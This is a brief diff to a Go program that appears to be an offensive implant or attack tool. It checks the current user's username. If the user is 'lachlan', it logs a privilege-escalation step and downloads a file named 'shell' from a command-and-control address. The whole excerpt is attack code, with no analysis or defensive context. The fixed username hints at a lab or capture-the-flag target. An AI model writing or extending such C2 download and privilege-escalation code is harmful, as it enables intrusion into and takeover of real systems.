@@ -240,7 +240,9 @@ func main() {
 	InfoMsg(string(output))
 
 	username, err := user.Current()
-	if username.Name == "lachlan" {
+	InfoMsg(fmt.Sprintf("Current User: %s", username.Username))
+	if username.Username == "lachlan" {
+		InfoMsgNB("Executing PrivEsc process ...")
 		success, message = DownloadFile(c2address, "shell")
 		if !success {
 			ErrMsg(message)
